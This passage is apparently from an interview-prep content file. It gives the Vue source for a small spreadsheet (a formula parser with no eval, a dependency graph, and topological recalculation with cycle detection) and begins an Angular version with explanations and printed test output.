<strong style="color:#ffca28;">1. Engine first:</strong> <span style="color:#f0e2c8;">"A framework-free <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">createSheet</code> with raw text, parsed ASTs, <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">deps</code>, <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">rdeps</code> and values, and <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">update</code> returning the recalculation order."</span>
</blockquote>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">2. Parser:</strong> <span style="color:#f0e2c8;">"Tokenizer and recursive descent with one function per precedence level, no <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">eval</code>, and errors as values."</span>
</blockquote>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">3. Recalc:</strong> <span style="color:#f0e2c8;">"Dirty set through <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">rdeps</code>, Kahn on that set, and leftovers marked <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">#CYCLE!</code>."</span>
</blockquote>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">4. Vue layer:</strong> <span style="color:#f0e2c8;">"<code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">markRaw</code> engine, a <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">version</code> ref read by the <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">computed</code> grid, and one <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">draft</code> shared by the cell editor and the formula bar."</span>
</blockquote>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">5. Keyboard:</strong> <span style="color:#f0e2c8;">"Roving <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">tabindex</code>, Excel keys, <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">@keydown.stop</code> in the editor, and <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">nextTick</code> focus."</span>
</blockquote>

<div style="color:#e0a83e;font-size:0.8em;font-weight:bold;text-transform:uppercase;letter-spacing:0.6px;margin:22px 0 10px 0;border-top:1px solid #4a3a1a;padding-top:16px;">Follow-Up Questions to Expect</div>

<div style="background:#3d2810;border-radius:8px 8px 0 0;padding:10px 16px;margin:12px 0 0 0;">
<span style="color:#ff8a65;font-weight:bold;">❓ Q:</span> <span style="color:#ffe0b2;">Why not <code style="background:#4a3418;color:#ffe0b2;padding:1px 5px;border-radius:3px;">reactive(createSheet())</code>?</span>
</div>
<div style="background:#151a15;border:1px solid #f9a825;border-top:none;border-radius:0 0 8px 8px;padding:10px 16px;margin:0 0 14px 0;">
<span style="color:#66bb6a;font-weight:bold;">💡 A:</span> <span style="color:#d8d8d8;">Every Map read in a recalculation would be tracked and every write would trigger; the engine is a black box, so one version ref is the right granularity.</span>
</div>

<div style="background:#3d2810;border-radius:8px 8px 0 0;padding:10px 16px;margin:0;">
<span style="color:#ff8a65;font-weight:bold;">❓ Q:</span> <span style="color:#ffe0b2;">How would you add copy and paste of formulas?</span>
</div>
<div style="background:#151a15;border:1px solid #f9a825;border-top:none;border-radius:0 0 8px 8px;padding:10px 16px;margin:0 0 14px 0;">
<span style="color:#66bb6a;font-weight:bold;">💡 A:</span> <span style="color:#d8d8d8;">Parse the formula, shift relative refs by the row and column offset, and serialise the AST back; that needs absolute refs like <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">$B$4</code> in the grammar.</span>
</div>

<div style="background:#3d2810;border-radius:8px 8px 0 0;padding:10px 16px;margin:0;">
<span style="color:#ff8a65;font-weight:bold;">❓ Q:</span> <span style="color:#ffe0b2;">How would this scale to a million cells?</span>
</div>
<div style="background:#151a15;border:1px solid #f9a825;border-top:none;border-radius:0 0 8px 8px;padding:10px 16px;margin:0 0 14px 0;">
<span style="color:#66bb6a;font-weight:bold;">💡 A:</span> <span style="color:#d8d8d8;">Store only non-empty cells (already Maps), virtualise the rows, and keep the dirty-set recalculation; move the engine to a Web Worker if a recalculation gets slow.</span>
</div>

<div style="background:#3d2810;border-radius:8px 8px 0 0;padding:10px 16px;margin:0;">
<span style="color:#ff8a65;font-weight:bold;">❓ Q:</span> <span style="color:#ffe0b2;">How would you add undo?</span>
</div>
<div style="background:#151a15;border:1px solid #f9a825;border-top:none;border-radius:0 0 8px 8px;padding:10px 16px;margin:0;">
<span style="color:#66bb6a;font-weight:bold;">💡 A:</span> <span style="color:#d8d8d8;">Record <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">{ id, before, after }</code> per commit and replay <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">sheet.update</code> with the old raw text; the engine recalculates dependents by itself.</span>
</div>

</div>

## 8. Quick Glossary

| Term | Plain meaning |
| :--- | :--- |
| **markRaw** | Keep an object out of Vue reactivity |
| **Version counter** | A ref bumped to say "re-read the engine" |
| **Recursive descent** | One parser function per grammar rule |
| **Topological order** | Every cell after the cells it reads |
| **Event modifiers** | \`.stop\`, \`.prevent\` on \`@\` listeners |
| **nextTick** | Wait for the DOM patch |

---
**Conclusion:** The Vue spreadsheet is a plain engine (safe parser, dependency maps, Kahn recalculation with cycle detection) behind \`markRaw\`, a version ref that tells \`computed\` when to re-read it, and a small editing state machine. The verified run shows dependents recalculating in dependency order, a two-cell cycle reported and then repaired, and every error type surfacing as a value.`,
        files: {
          "/src/App.vue": `<script setup>
import Spreadsheet from "./components/Spreadsheet.vue";
</script>

<template>
  <main class="page">
    <h1 style="font-size: 18px">Budget</h1>
    <Spreadsheet />
  </main>
</template>

<style>
body {
  margin: 0;
  background: #0f1115;
  color: #e6e6e6;
  font-family: system-ui, sans-serif;
}
.page {
  max-width: 760px;
  margin: 0 auto;
  padding: 20px 16px;
}
.ss-bar {
  display: flex;
  gap: 8px;
  margin-bottom: 8px;
}
.ss-name {
  min-width: 44px;
  padding: 6px 8px;
  border: 1px solid #2c3340;
  border-radius: 6px;
  background: #171a21;
  text-align: center;
  font:
    600 13px ui-monospace,
    monospace;
}
.ss-bar input {
  flex: 1;
  min-width: 0;
  padding: 6px 8px;
  border: 1px solid #2c3340;
  border-radius: 6px;
  background: #0f1115;
  color: #e6e6e6;
  font:
    13px ui-monospace,
    monospace;
}
.ss-scroll {
  overflow-x: auto;
  border: 1px solid #2c3340;
  border-radius: 8px;
}
table {
  border-collapse: collapse;
  width: 100%;
  min-width: 520px;
  font-size: 13px;
}
th {
  background: #171a21;
  color: #8b949e;
  font-weight: 500;
  padding: 4px 6px;
  border: 1px solid #262c36;
}
td {
  border: 1px solid #262c36;
  padding: 0 6px;
  height: 28px;
  min-width: 80px;
  white-space: nowrap;
  overflow: hidden;
  text-overflow: ellipsis;
  max-width: 120px;
  cursor: cell;
}
td.num {
  text-align: right;
  font-variant-numeric: tabular-nums;
}
td.err {
  color: #ff8a80;
}
td.sel {
  outline: 2px solid #f9a825;
  outline-offset: -2px;
  background: #1c140a;
}
td input {
  width: 100%;
  box-sizing: border-box;
  border: 0;
  background: #1c140a;
  color: #ffe0b2;
  font:
    13px ui-monospace,
    monospace;
  outline: none;
  padding: 4px 0;
}
.ss-status {
  font-size: 13px;
  color: #9aa4b2;
}
</style>
`,
          "/src/components/Spreadsheet.vue": `<script setup>
import { computed, markRaw, nextTick, ref } from "vue";
import {
  COLS,
  ROWS,
  SAMPLE,
  createSheet,
  display,
  isErr,
  splitRef,
} from "../engine.js";

const ROW_IDS = Array.from({ length: ROWS }, (_, i) => i + 1);

// The engine is a plain mutable object. markRaw keeps Vue from wrapping its
// Maps in proxies; a version ref tells the template when to re-read it.
const sheet = markRaw(createSheet());
sheet.update(SAMPLE);
const version = ref(0);
const selected = ref("A1");
const draft = ref(null); // null = not editing
const editIn = ref("cell"); // which editor owns the draft
const last = ref(null);
const grid = ref(null);

const rows = computed(() => {
  version.value; // dependency: re-run after every commit
  return ROW_IDS.map((r) =>
    COLS.map((c) => ({ id: c + r, v: sheet.get(c + r) })),
  );
});
const barValue = computed(() => {
  version.value;
  return draft.value !== null ? draft.value : sheet.raw(selected.value);
});

async function focusLater() {
  await nextTick();
  grid.value
    ?.querySelector(
      draft.value !== null && editIn.value === "cell"
        ? "input"
        : '[tabindex="0"]',
    )
    ?.focus();
}
function commit(text) {
  last.value = sheet.update({ [selected.value]: text });
  version.value++;
  draft.value = null;
}
function select(id) {
  selected.value = id;
  focusLater();
}
function move(dc, dr) {
  const { c, r } = splitRef(selected.value);
  const nc = Math.min(COLS.length - 1, Math.max(0, c + dc)),
    nr = Math.min(ROWS - 1, Math.max(0, r + dr));
  select(COLS[nc] + (nr + 1));
}
function startEdit(text) {
  draft.value = text;
  editIn.value = "cell";
  focusLater();
}

function onCellKey(e) {
  // the editor handles its own keys
  if (draft.value !== null && editIn.value === "cell") return;
  const arrows = {
    ArrowUp: [0, -1],
    ArrowDown: [0, 1],
    ArrowLeft: [-1, 0],
    ArrowRight: [1, 0],
  };
  if (arrows[e.key]) {
    e.preventDefault();
    move(...arrows[e.key]);
  } else if (e.key === "Enter" || e.key === "F2") {
    e.preventDefault();
    startEdit(sheet.raw(selected.value));
  } else if (e.key === "Delete" || e.key === "Backspace") {
    e.preventDefault();
    commit("");
  } else if (e.key.length === 1 && !e.ctrlKey && !e.metaKey && !e.altKey) {
    e.preventDefault();
    startEdit(e.key);
  }
}
function onEditorKey(e) {
  if (e.key === "Enter") {
    e.preventDefault();
    commit(draft.value);
    move(0, 1);
  } else if (e.key === "Tab") {
    e.preventDefault();
    commit(draft.value);
    move(e.shiftKey ? -1 : 1, 0);
  } else if (e.key === "Escape") {
    e.preventDefault();
    draft.value = null;
    select(selected.value);
  }
}
function onBarInput(e) {
  draft.value = e.target.value;
  editIn.value = "bar";
}
function onBarKey(e) {
  if (e.key === "Enter" && draft.value !== null) {
    e.preventDefault();
    commit(draft.value);
  } else if (e.key === "Escape") {
    e.preventDefault();
    draft.value = null;
  }
}
function onCellDown(id) {
  // clicking away commits
  if (draft.value !== null && id !== selected.value) commit(draft.value);
  select(id);
}

const status = computed(() => {
  if (!last.value)
    return "Edit a cell. Formulas start with =, e.g. =SUM(B1:B3).";
  return last.value.cycle.length
    ? \`Circular reference: \${last.value.cycle.join(", ")}\`
    : \`Recalculated: \${last.value.order.join(" → ")}\`;
});
const cellClass = (cellItem) => ({
  sel: cellItem.id === selected.value,
  err: isErr(cellItem.v),
  num: typeof cellItem.v === "number",
});
const editingHere = (id) =>
  id === selected.value && draft.value !== null && editIn.value === "cell";
</script>

<template>
  <div class="ss">
    <div class="ss-bar">
      <span class="ss-name" aria-label="Selected cell">{{ selected }}</span>
      <input
        aria-label="Formula bar"
        data-testid="bar"
        :value="barValue"
        @input="onBarInput"
        @keydown="onBarKey"
      />
    </div>
    <div class="ss-scroll">
      <table role="grid" aria-label="Spreadsheet" ref="grid">
        <thead>
          <tr>
            <th aria-hidden="true"></th>
            <th v-for="c in COLS" :key="c" scope="col">{{ c }}</th>
          </tr>
        </thead>
        <tbody>
          <tr v-for="(row, i) in rows" :key="i">
            <th scope="row">{{ i + 1 }}</th>
            <td
              v-for="cellItem in row"
              :key="cellItem.id"
              :data-cell="cellItem.id"
              :tabindex="cellItem.id === selected ? 0 : -1"
              :aria-selected="cellItem.id === selected"
              :class="cellClass(cellItem)"
              @mousedown="onCellDown(cellItem.id)"
              @dblclick="startEdit(sheet.raw(cellItem.id))"
              @keydown="onCellKey"
            >
              <input
                v-if="editingHere(cellItem.id)"
                :aria-label="\`Edit \${cellItem.id}\`"
                v-model="draft"
                @keydown.stop="onEditorKey"
              />
              <template v-else>{{ display(cellItem.v) }}</template>
            </td>
          </tr>
        </tbody>
      </table>
    </div>
    <p class="ss-status" role="status" data-testid="status">{{ status }}</p>
  </div>
</template>
`,
          "/src/engine.js": `// A tiny spreadsheet engine: tokenizer -> recursive-descent parser -> AST,
// a dependency graph, and recalculation in topological order. No eval().
export const COLS = ["A", "B", "C", "D", "E"];
export const ROWS = 8;
const FUNCS = {
  SUM: (xs) => xs.reduce((a, b) => a + b, 0),
  AVERAGE: (xs) =>
    xs.length ? xs.reduce((a, b) => a + b, 0) / xs.length : err("#DIV/0!"),
  MIN: (xs) => (xs.length ? Math.min(...xs) : 0),
  MAX: (xs) => (xs.length ? Math.max(...xs) : 0),
};

export const err = (code) => ({ error: code });
export const isErr = (v) => v !== null && typeof v === "object" && "error" in v;
const isDigit = (c) => c >= "0" && c <= "9";
const isLetter = (c) => c >= "A" && c <= "Z";

// "B12" -> { c: 1, r: 11 }, or null when it is not a cell inside the grid.
export function splitRef(id) {
  let i = 0;
  while (i < id.length && isLetter(id[i])) i++;
  const c = COLS.indexOf(id.slice(0, i)),
    r = Number(id.slice(i)) - 1;
  return i > 0 &&
    i < id.length &&
    c >= 0 &&
    Number.isInteger(r) &&
    r >= 0 &&
    r < ROWS
    ? { c, r }
    : null;
}

function tokenize(src) {
  const out = [];
  let i = 0;
  while (i < src.length) {
    const ch = src[i];
    if (ch === " ") {
      i++;
      continue;
    }
    if (isDigit(ch) || ch === ".") {
      let j = i;
      while (j < src.length && (isDigit(src[j]) || src[j] === ".")) j++;
      const n = Number(src.slice(i, j));
      if (Number.isNaN(n)) throw err("#ERROR!");
      out.push({ t: "num", v: n });
      i = j;
      continue;
    }
    if (isLetter(ch.toUpperCase())) {
      let j = i;
      while (
        j < src.length &&
        (isLetter(src[j].toUpperCase()) || isDigit(src[j]))
      )
        j++;
      const word = src.slice(i, j).toUpperCase();
      out.push({ t: isDigit(word[word.length - 1]) ? "ref" : "name", v: word });
      i = j;
      continue;
    }
    if ("+-*/(),:".includes(ch)) {
      out.push({ t: ch });
      i++;
      continue;
    }
    throw err("#ERROR!");
  }
  return out;
}

// Grammar: expr := term (("+" | "-") term)* term := unary (("*" | "/") unary)*
// unary := "-" unary | atom atom := num | ref | ref ":"
// ref | name "(" args ")" | "(" expr ")"
export function parse(src) {
  const toks = tokenize(src);
  let p = 0;
  const peek = () => toks[p]?.t;
  const eat = (t) => {
    if (peek() !== t) throw err("#ERROR!");
    return toks[p++];
  };
  function expr() {
    let node = term();
    while (peek() === "+" || peek() === "-")
      node = { t: "bin", op: toks[p++].t, l: node, r: term() };
    return node;
  }
  function term() {
    let node = unary();
    while (peek() === "*" || peek() === "/")
      node = { t: "bin", op: toks[p++].t, l: node, r: unary() };
    return node;
  }
  function unary() {
    if (peek() === "-") {
      p++;
      return { t: "neg", e: unary() };
    }
    if (peek() === "+") {
      p++;
      return unary();
    }
    return atom();
  }
  function atom() {
    const tok = toks[p];
    if (!tok) throw err("#ERROR!");
    if (tok.t === "num") {
      p++;
      return { t: "num", v: tok.v };
    }
    if (tok.t === "ref") {
      p++;
      if (peek() === ":") {
        p++;
        return { t: "range", from: tok.v, to: eat("ref").v };
      }
      return { t: "ref", id: tok.v };
    }
    if (tok.t === "name") {
      p++;
      eat("(");
      const args = [];
      if (peek() !== ")") {
        args.push(expr());
        while (peek() === ",") {
          p++;
          args.push(expr());
        }
      }
      eat(")");
      return { t: "fn", name: tok.v, args };
    }
    if (tok.t === "(") {
      p++;
      const e = expr();
      eat(")");
      return e;
    }
    throw err("#ERROR!");
  }
  const tree = expr();
  if (p !== toks.length) throw err("#ERROR!");
  return tree;
}

function expand(from, to) {
  const a = splitRef(from),
    b = splitRef(to);
  if (!a || !b) return null;
  const ids = [];
  for (let c = Math.min(a.c, b.c); c <= Math.max(a.c, b.c); c++)
    for (let r = Math.min(a.r, b.r); r <= Math.max(a.r, b.r); r++)
      ids.push(COLS[c] + (r + 1));
  return ids;
}

function refsOf(node, acc = new Set()) {
  if (node.t === "ref") acc.add(node.id);
  else if (node.t === "range")
    (expand(node.from, node.to) || []).forEach((id) => acc.add(id));
  else if (node.t === "bin") {
    refsOf(node.l, acc);
    refsOf(node.r, acc);
  } else if (node.t === "neg") refsOf(node.e, acc);
  else if (node.t === "fn") node.args.forEach((a) => refsOf(a, acc));
  return acc;
}

// Evaluate an AST. get(id) returns the
// current value of a cell. Errors propagate.
function evaluate(node, get) {
  const num = (v) =>
    isErr(v) ? v : v === "" ? 0 : typeof v === "number" ? v : err("#VALUE!");
  switch (node.t) {
    case "num":
      return node.v;
    case "ref":
      return splitRef(node.id) ? num(get(node.id)) : err("#REF!");
    case "neg": {
      const v = evaluate(node.e, get);
      return isErr(v) ? v : -v;
    }
    case "bin": {
      const l = evaluate(node.l, get);
      if (isErr(l)) return l;
      const r = evaluate(node.r, get);
      if (isErr(r)) return r;
      if (node.op === "/" && r === 0) return err("#DIV/0!");
      return node.op === "+"
        ? l + r
        : node.op === "-"
          ? l - r
          : node.op === "*"
            ? l * r
            : l / r;
    }
    case "range":
      return err("#VALUE!"); // a bare range only makes sense inside a function
    case "fn": {
      const fn = FUNCS[node.name];
      if (!fn) return err("#NAME?");
      const xs = [];
      for (const a of node.args) {
        if (a.t === "range") {
          const ids = expand(a.from, a.to);
          if (!ids) return err("#REF!");
          for (const id of ids) {
            const v = get(id);
            if (isErr(v)) return v;
            if (typeof v === "number") xs.push(v);
          } // text and blanks are skipped
        } else {
          const v = evaluate(a, get);
          if (isErr(v)) return v;
          xs.push(v);
        }
      }
      return fn(xs);
    }
  }
  return err("#ERROR!");
}

export function createSheet() {
  const raw = new Map(),
    formula = new Map(),
    deps = new Map(),
    rdeps = new Map(),
    values = new Map();
  const get = (id) => (values.has(id) ? values.get(id) : "");

  function setRaw(id, text) {
    // drop old edges
    for (const d of deps.get(id) || []) rdeps.get(d)?.delete(id);
    raw.set(id, text);
    let refs = new Set();
    if (text.startsWith("=")) {
      try {
        const tree = parse(text.slice(1));
        formula.set(id, tree);
        refs = refsOf(tree);
      } catch (e) {
        formula.set(id, isErr(e) ? e : err("#ERROR!"));
      }
    } else formula.delete(id);
    deps.set(id, refs);
    for (const d of refs) {
      if (!rdeps.has(d)) rdeps.set(d, new Set());
      rdeps.get(d).add(id);
    }
  }

  function compute(id) {
    const f = formula.get(id),
      text = raw.get(id) || "";
    if (!f)
      values.set(
        id,
        text.trim() === ""
          ? ""
          : Number.isNaN(Number(text))
            ? text
            : Number(text),
      );
    else values.set(id, isErr(f) ? f : evaluate(f, get));
  }

  // Apply edits, then recalculate only the edited
  // cells and everything downstream of them.
  // Returns the recalculation order, which is what the UI shows.
  function update(changes) {
    for (const [id, text] of Object.entries(changes)) setRaw(id, text);
    const dirty = new Set(),
      stack = Object.keys(changes);
    while (stack.length) {
      const id = stack.pop();
      if (dirty.has(id)) continue;
      dirty.add(id);
      for (const d of rdeps.get(id) || []) stack.push(d);
    }
    // Kahn topological sort restricted to the dirty set.
    const indeg = new Map(
      [...dirty].map((id) => [
        id,
        [...(deps.get(id) || [])].filter((d) => dirty.has(d)).length,
      ]),
    );
    const queue = [...dirty].filter((id) => indeg.get(id) === 0).sort();
    const order = [];
    while (queue.length) {
      const id = queue.shift();
      order.push(id);
      compute(id);
      for (const d of [...(rdeps.get(id) || [])].sort()) {
        if (!dirty.has(d)) continue;
        indeg.set(d, indeg.get(d) - 1);
        if (indeg.get(d) === 0) queue.push(d);
      }
    }
    // Whatever never reached in-degree 0 is on a cycle or downstream of one.
    const stuck = [...dirty].filter((id) => !order.includes(id)).sort();
    for (const id of stuck) values.set(id, err("#CYCLE!"));
    return { order, cycle: stuck };
  }

  return { update, get, raw: (id) => raw.get(id) || "" };
}

export function display(v) {
  if (isErr(v)) return v.error;
  // 0.1+0.2 shows 0.3
  if (typeof v === "number") return String(Number(v.toFixed(10)));
  return v;
}

export const SAMPLE = {
  A1: "Rent",
  B1: "1200",
  A2: "Food",
  B2: "450.50",
  A3: "Travel",
  B3: "180",
  A4: "Total",
  B4: "=SUM(B1:B3)",
  C1: "=B1/B4",
  D1: "=B1*12",
  A6: "Tax rate",
  B6: "0.2",
  B7: "=B4*B6",
  C4: "=MAX(B1:B3)-MIN(B1:B3)",
};
`,
        },
      },
      angular: {
        answer: `**Target Audience:** Angular developers preparing for a machine coding round. Assumes standalone components, signals and the built-in control flow.
**Difficulty:** Hard

> **How to read this doc:** Plain words first, then a <code>📌 Interview term:</code> callout. "Verified" output was printed by the real code: the typed formula engine in Node 22, and this Angular 22.2.3 component booted in jsdom, compiled AOT with strict templates and again with runtime JIT (the playground mode), driven by a script.

## 1. Why This Even Matters — A Story First

An accountant changes one invoice line and the totals, the tax line and the percentage column all update before they look up. Behind that is a small compiler (formula text to a tree), a graph (who reads whom), a scheduler (what to recompute, in which order) and a guard against formulas that point back at themselves. Rendering a 5 by 8 grid in Angular is ten minutes; the engine is what the interviewer is grading.

## 2. Plan and the Signal Model

The engine is plain TypeScript with no Angular imports: \`createSheet()\` returns \`{ update(changes): Recalc, get(id): Value, raw(id): string }\`, where \`Value = number | string | CellError\`.

| Piece | Angular tool | Notes |
| :--- | :--- | :--- |
| \`sheet\` | plain field | Mutable engine; Angular never sees inside it. |
| \`version\` | \`signal(0)\` | Bumped after each commit. |
| \`rows\`, \`barValue\`, \`status\` | \`computed\` | Read \`version()\` so they re-run after a commit. |
| \`selected\`, \`draft\`, \`editIn\`, \`last\` | \`signal\` | UI state; \`draft\` is \`string \\| null\`. |
| Focus | \`afterNextRender\` with the injector | Runs after the new cell or input exists. |

📌 **Interview term: Version signal** — signals track signals, not arbitrary objects. Reading \`this.version()\` inside a \`computed\` makes it a dependency, so incrementing it is how a non-reactive store says "read me again":

\`\`\`ts
readonly sheet = createSheet();
private version = signal(0);
rows = computed(() => {
  this.version(); // dependency: re-run after every commit
  return Array.from({ length: ROWS }, (_, r) =>
    COLS.map((c) => ({
      id: c + (r + 1),
      v: this.sheet.get(c + (r + 1)),
    })),
  );
});
commit(text: string) {
  this.last.set(this.sheet.update({ [this.selected()]: text }));
  this.version.update((v) => v + 1);
  this.draft.set(null);
}
\`\`\`

Because the app is zoneless, a plain field changed by \`sheet.update\` would not schedule a render at all; the signal write does ([zoneless Angular](/interview-question/what-is-zoneless-angular-and-how-does-it-improve-performance-in-angular-18)).

## 3. Build It Step by Step

### 3.1 Types make the error model honest

\`\`\`ts
export type CellError = { error: string };
export type Value = number | string | CellError;
export const isErr = (v: unknown): v is CellError =>
  v !== null && typeof v === "object" && "error" in v;
\`\`\`

📌 **Interview term: Type guard** — \`v is CellError\` narrows the union after the check, so the evaluator can write \`if (typeof l !== "number" || typeof r !== "number") return err("#VALUE!")\` and then add \`l + r\` with no casts. Porting the JavaScript engine to strict TypeScript flagged one real gap: \`values.get(id)\` is \`Value | undefined\`, fixed with \`?? ""\` (an empty cell).

### 3.2 Parser: recursive descent, no \`eval\`

\`\`\`ts
// expr  := term (("+" | "-") term)*
// term  := unary (("*" | "/") unary)*
// unary := "-" unary | atom
// atom  := num | ref | ref ":" ref | name "(" args ")" | "(" expr ")"
\`\`\`

One function per rule returns typed AST nodes (\`{ t: "bin"; op; l; r }\`, \`{ t: "fn"; name; args }\`, \`{ t: "range"; from; to }\`). Only these node types exist, so a formula cannot run code; \`eval\` would give a shared sheet the page. The grammar is also how references are extracted for the dependency graph.

📌 **Interview term: Errors as values** — \`#DIV/0!\`, \`#VALUE!\`, \`#NAME?\`, \`#REF!\` and \`#ERROR!\` are \`CellError\` objects that propagate through every operation, instead of exceptions that would abort the whole recalculation.

### 3.3 Graph and recalculation

\`setRaw(id, text)\` removes the cell's old edges from \`rdeps\`, parses, and records new \`deps\` and \`rdeps\`. \`update(changes)\` collects the dirty set (edited cells plus everything reachable through \`rdeps\`), then runs Kahn's algorithm restricted to it:

\`\`\`ts
const indeg = new Map(
  [...dirty].map((id) => [
    id,
    [...(deps.get(id) || [])].filter((d) => dirty.has(d)).length,
  ]),
);
const queue = [...dirty].filter((id) => indeg.get(id) === 0).sort();
while (queue.length) {
  const id = queue.shift()!;
  order.push(id);
  compute(id);
  for (const d of [...(rdeps.get(id) || [])].sort()) {
    if (!dirty.has(d)) continue;
    indeg.set(d, indeg.get(d)! - 1);
    if (indeg.get(d) === 0) queue.push(d);
  }
}
const stuck = [...dirty].filter((id) => !order.includes(id)).sort();
for (const id of stuck) values.set(id, err("#CYCLE!"));
\`\`\`

📌 **Interview term: Kahn's algorithm** — topological sorting by repeatedly removing nodes with no unprocessed inputs. Nodes that never get there are on a cycle or downstream of one, so cycle detection needs no extra pass.

### 3.4 Template: grid, editor, formula bar

\`\`\`html
@for (cell of row; track cell.id) {
  <td
    [attr.data-cell]="cell.id"
    [attr.tabindex]="cell.id === selected() ? 0 : -1"
    [attr.aria-selected]="cell.id === selected()"
    [class.sel]="cell.id === selected()"
    [class.err]="isErr(cell.v)"
    [class.num]="isNum(cell.v)"
    (mousedown)="onCellDown(cell.id)"
    (dblclick)="startEdit(sheet.raw(cell.id))"
    (keydown)="onCellKey($event)"
  >
    @if (editingHere(cell.id)) {
      <input
        [attr.aria-label]="'Edit ' + cell.id"
        [value]="draft()"
        (input)="draft.set(val($event))"
        (keydown)="onEditorKey($event)"
      />
    } @else {
      {{ display(cell.v) }}
    }
  </td>
}
\`\`\`

\`[value]\` plus \`(input)\` replaces \`ngModel\`, so no \`FormsModule\` is needed and the signal stays the single source of truth. \`onEditorKey\` calls \`e.stopPropagation()\` first, so arrows inside the input move the caret rather than reaching \`onCellKey\` on the \`<td>\`. Enter commits and moves down, Tab commits and moves right, Escape discards; the formula bar edits the same \`draft\` with \`editIn\` set to \`"bar"\`.

### 3.5 Focus after render

\`\`\`ts
private focusLater() {
  afterNextRender(
    () => {
      const sel =
        this.draft() !== null && this.editIn() === "cell"
          ? "td input"
          : 'td[tabindex="0"]';
      this.host.nativeElement.querySelector(sel)?.focus();
    },
    { injector: this.injector },
  );
}
\`\`\`

📌 **Interview term: afterNextRender** — schedules a callback after the next render; outside a constructor it needs \`{ injector }\` ([afterRender vs afterNextRender](/interview-question/what-is-the-difference-between-afterrender-and-afternextrender-lifecycle-hooks)).

## 4. Verified

The typed engine, compiled and run in Node 22, printed the same lines as the JavaScript engine:

\`\`\`text
load order: A1 A2 A3 A4 A6 B1 B2 B3 B6 D1 B4 C4 B7 C1
B4=1830.5  C1=0.6555585905  D1=14400  B7=366.1  C4=1020
B2=500 -> recalculated: B2 B4 C4 B7 C1 | B4=1880  C1=0.6382978723  B7=376  C4=1020
=1+2*3 -> 7 | =(1+2)*3 -> 9 | =-2*-3 -> 6 | =10/4-1 -> 1.5 | =0.1+0.2 -> 0.3 | =SUM(B3:B1)+AVERAGE(1,2,3) -> 1882 | =1/0 -> #DIV/0! | =FOO(1) -> #NAME?
=1+ -> #ERROR! | =A1+1 -> #VALUE! | =Z9 -> #REF! | =SUM(A1:A9) -> #REF! | =2^3 -> #ERROR! | =E7+1 -> #DIV/0!
cycle C6->C7->C8->C6: order (none) | stuck C6 C7 C8 | C6=#CYCLE!  C7=#CYCLE!  C8=#CYCLE!
C8=5 -> recalculated: C8 C7 C6 | C6=11  C7=10  C8=5
self ref: C5=#CYCLE!
\`\`\`

The component in jsdom, AOT and JIT both printing these lines, identical to React and Vue:

\`\`\`text
loaded: B1=1200 B2=450.5 B3=180 B4=1830.5 C1=0.6555585905 D1=14400 B7=366.1 C4=1020
select B4 -> bar: =SUM(B1:B3) | focus: B4
bar B2=500 -> Recalculated: B2 → B4 → C4 → B7 → C1 | B4=1880 C1=0.6382978723 B7=376
ArrowDown -> focus: B3
type 9 -> editor: Edit B3 value 9
Enter -> Recalculated: B3 → B4 → C4 → B7 → C1 | B3=90 B4=1790 | focus: B4
edit A1, Escape -> A1=Rent | focus: A1
C6 =C7+1, C7 =C6*2 -> Circular reference: C6, C7 | C6=#CYCLE! C7=#CYCLE!
C7 =5 -> Recalculated: C7 → C6 | C6=6 C7=5
errors: D2=#DIV/0! D3=#NAME? D4=#VALUE! D5=#ERROR! D6=0.3
Delete D4 -> D4= | Recalculated: D4
E1 via Tab -> E1=3580 | focus: E1
\`\`\`

Editing B2 recalculated exactly five cells in dependency order, the C6/C7 cycle was reported and then repaired by giving C7 a constant, and every error code appeared as a value. Colours and column widths were not checked.

## 5. Edge Cases and Accessibility

| Concern | Handling |
| :--- | :--- |
| Self-reference and longer cycles | \`#CYCLE!\` from Kahn leftovers |
| Removing a formula | Old edges dropped in \`setRaw\` |
| Float noise | \`display\` rounds to 10 decimal places |
| Unsafe input | Grammar only, no \`eval\` or \`new Function\` |
| Keyboard | \`role="grid"\`, roving \`tabindex\`, Excel keys |
| Announcements | \`role="status"\` shows the recalculation order or the cycle |

## 6. Common Pitfalls

- **Storing the grid in a plain field.** Zoneless Angular does not render a change it was not told about; use signals.
- **Forgetting \`this.version()\` inside a \`computed\`.** It memoises the first grid forever.
- **Not dropping old edges** when a formula changes. A cell keeps recalculating because of a reference it no longer has.
- **Recursive evaluation without a visited set.** A cycle is a stack overflow; topological order avoids recursion entirely.
- **\`track $index\` for cells.** Use \`cell.id\`; the row loop can use \`$index\` because rows never reorder.

## 7. How to Answer in an Interview

<div style="background:#1c140a;border:2px solid #f9a825;border-radius:10px;padding:20px 24px;margin:20px 0;">

<div style="color:#ffca28;font-size:1.15em;font-weight:bold;margin-bottom:16px;">🎤 How to Answer in an Interview</div>

<div style="color:#e0a83e;font-size:0.8em;font-weight:bold;text-transform:uppercase;letter-spacing:0.6px;margin:0 0 10px 0;">The 60-Second Answer</div>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
